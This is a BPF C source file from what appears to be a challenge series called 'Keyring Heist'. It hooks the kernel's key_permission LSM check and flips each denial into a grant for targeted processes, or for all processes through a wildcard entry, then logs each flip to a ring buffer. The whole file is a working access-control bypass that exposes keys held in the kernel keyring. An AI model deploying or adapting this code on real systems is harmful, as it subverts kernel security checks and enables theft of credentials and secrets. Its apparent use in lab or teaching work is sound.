// ch08 Keyring Heist — REAL mutation variant via BPF LSM fmod_ret.
//
// Sibling to ch08-keyring-heist (observer). On a kernel built with
// CONFIG_BPF_LSM=y and booted with `lsm=bpf,...`, this program overrides
// `security_key_permission` to return 0 (permission granted) for tgids in
// the target_tgids map whenever the underlying LSM would have denied. No
// error_injection allowlist needed — LSM fmod_ret is the first-class
// override primitive.
//
// Verify prerequisites on the host before running:
//   cat /sys/kernel/security/lsm      # must contain "bpf"
//   bpftool feature probe | grep lsm  # must show "lsm_fmod_ret ok"
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define KEY_TYPE_NAME_LEN 16

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    unsigned int serial;
    unsigned int need_perm;
    int orig_ret;
    int flipped;
    char type_name[KEY_TYPE_NAME_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// Key 0 == wildcard ("flip denials for every tgid").
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

// lsm/key_permission fmod_ret. Real kernel signature:
//   int security_key_permission(key_ref_t key_ref,
//                               const struct cred *cred,
//                               enum key_need_perm need_perm)
// BPF_PROG appends the original ret at the tail. Returning 0 = allow.
//
// NOTE: key_ref_t has a FWD (forward-declaration) BTF type on some
// kernels (e.g., linuxkit 6.12). The BPF_PROG macro unpacks ALL
// args — including arg0 (key_ref) — and the verifier rejects context
// access at offset 0 when the type is FWD.  Work around this by using
// raw context and only reading the args we need at their known offsets:
//   ctx[0] = key_ref   (FWD — skip)
//   ctx[1] = cred      (skip)
//   ctx[2] = need_perm
//   ctx[3] = ret        (original return value for fmod_ret)
SEC("lsm/key_permission")
int lsm_key_permission(unsigned long long *ctx)
{
    unsigned int need_perm = (unsigned int)ctx[2];
    int ret = (int)ctx[3];

    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    unsigned int *hit = bpf_map_lookup_elem(&target_tgids, &tgid);
    unsigned int zero = 0;
    int is_target = (hit || bpf_map_lookup_elem(&target_tgids, &zero)) ? 1 : 0;

    int new_ret = ret;
    int flipped = 0;
    if (is_target && ret != 0) {
        new_ret = 0;      // real mutation: deny -> grant
        flipped = 1;
    }

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (e) {
        unsigned long id = bpf_get_current_pid_tgid();
        e->pid = id & 0xffffffff;
        e->tgid = tgid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        e->need_perm = need_perm;
        e->orig_ret = ret;
        e->flipped = flipped;
        e->serial = 0;
        e->type_name[0] = 0;
        // NOTE: key_ref_t has FWD BTF type on linuxkit 6.12 — the
        // verifier blocks any ctx[0] access.  We skip reading the
        // key serial and type_name here; the kprobe variant
        // (ch08-keyring-heist-kprobe) can still read them.
        bpf_ringbuf_submit(e, 0);
    }
    return new_ret;
}
